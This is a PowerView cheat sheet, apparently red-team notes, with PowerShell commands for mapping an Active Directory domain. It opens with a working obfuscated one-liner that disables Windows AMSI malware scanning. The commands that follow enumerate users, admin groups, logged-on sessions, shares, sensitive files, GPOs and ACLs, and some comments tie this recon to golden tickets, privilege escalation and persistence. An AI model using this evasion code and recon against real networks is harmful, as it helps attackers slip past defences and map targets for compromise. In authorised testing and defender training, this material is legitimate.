# PowerView

- [PowerView](#powerview)
  - [Loading PowerView](#loading-powerview)
  - [Domains](#domains)
  - [Users](#users)
  - [Computers](#computers)
  - [Groups](#groups)
  - [Files & Shares](#files--shares)
  - [Group Policy](#group-policy)
  - [Organizational Units](#organizational-units)
  - [Access Control Lists](#access-control-lists)

More useful commands: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

## Loading PowerView

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1
```

## Domains

- General domain information
- Password policy
- Ticket policy, interesting for crafting appropriate golden/silver tickets
- List of domain controllers and HVTs

```powershell
# Get current domain
Get-NetDomain

# Get object of another domain
Get-NetDomain -Domain lab.local

# Get domain SID for current domain
Get-DomainSID

# Get domain policy for current domain
Get-DomainPolicy
(Get-DomainPolicy)."System Access"

# Get domain policy for another domain
# Password policy
(Get-DomainPolicy -Domain lab.local)."System Access"

# Kerberos policy for e.g. mimikatz golden tickets
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"

# Get domain controllers for current domain
Get-NetDomainController

# Get domain controllers for another domain
Get-NetDomainController -Domain lab.local
```

## Users

- List of users
- Inactive users
- Possible honeypot users with very low logon counts

```powershell
# Get list of users in current domain
Get-NetUser
Get-NetUser -Username student1
Get-NetUser | Select cn

# Get list of all properties for users in current domain
Get-UserProperty
Get-UserProperty -Properties pwdlastset

# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm "built"

# Get actively logged on users on a computer (needs local admin rights on the target)
Get-NetLoggedOn -ComputerName dc.lab.local

# Get actively logged on users on a computer (needs remote registry on the target - started by default on server OS)
Get-LoggedOnLocal -ComputerName dc.lab.local

# Get the last logged user on a computer (needs administrative rights and remote registry on the target)
Get-LastLoggedOn -ComputerName dc.lab.local
```

## Computers

- Types of computers
- Roles of computers
- Used operating systems
- Live hosts

```powershell
# Get list of computers in current domain
Get-NetComputer
Get-NetComputer -FullData

# Check for live hosts (depends on ICMP)
Get-NetComputer -Ping

# Information about operating systems
Get-NetComputer -OperatingSystem "*Server 2016"
Get-NetComputer -FullData | select dnshostname,operatingsystem
```

## Groups

- Intersting domain and local groups
- Group members
- Group membership for current user
- Query information about groups from forest root, e.g. for Enterprise Admins
- If RID is 5xx, it is built in, otherwise custom

```powershell
# Get all groups in current domain
Get-NetGroup
Get-NetGroup -FullData

# Get information about groups in other domain
Get-NetGroup -Domain lab.local

# Get all groups containing the word "admin" in group name
Get-NetGroup "*admin*"

# Get information about specific group
Get-NetGroup -FullData "Domain Admins"

# Get all members of Domain Admins group
# If member is a group, get members of that group as well
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Get list of Enterprise Admins, only available from forest root
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain lab.local

# Get group membership for a user
Get-NetGroup -UserName "student1"

# List all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -ListGroups

# Get members of all local groups on a machine (needs administrator privileges on non-dc machines)
Get-NetLocalGroup -ComputerName dc.lab.local -Recurse
```

## Files & Shares

```powershell
# Find shares on hosts in current domain
Invoke-ShareFinder -Verbose

# Find shares from other domain
Invoke-ShareFinder -Domain lab.local

# Exclude default shares
Invoke-ShareFinder -ExcludeStandard

# Show only shares the current user has access to
Invoke-ShareFinder -CheckShareAccess

# Find sensitive files on computers in the domain
Invoke-FileFinder -Verbose

# Get all fileservers of the domain
Get-NetFileServer
```

## Group Policy

- Security settings
- Registry-based policy settings
- GPP like start/shutdown/log-on/logff script settings
- Software installation
- Abused for privesc, backdoors, persistence

```powershell
# Get list of GPO in current domain
Get-NetGPO
Get-NetGPO -ComputerName ws01.lab.local

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-NetGPOGroup

# Get users which are in a local group of a machine usign GPO
Find-GPOComputerAdmin -ComputerName ws01.lab.local

# Get machines where the given user is member of a specific group
Find-GPOLocation -UserName user -Verbose
```

## Organizational Units

```powershell
# Get OUs in a domain
Get-NetOI -FullData

# Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
Get-NetGPO -GPOName "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
```

## Access Control Lists

- Access Control Entries (ACE) correspond to individual permission or audits access
- Who has permission and what can be done on an object?
- Two types:
  - DACL -> Defines the permissions trustees (a user or group) have on an object
  - SACL - Logs success and failure audit messages when an object is accessed

```powershell
# Get the ACLs associated with the specified object
Get-ObjectACL -SamAccountName user -ResolveGUIDs

# Get the ACLs associated with the specified prefix to be used for search
Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose

# Get the ACLs associated with the specified LDAP path to be used for search
Get-ObjectACL -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local" -ResolveGUIDs -Verbose

# Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

# Get the ACLs associated with the specified path
Get-PathACL -Path "\\dc01.lab.local\sysvol"
```
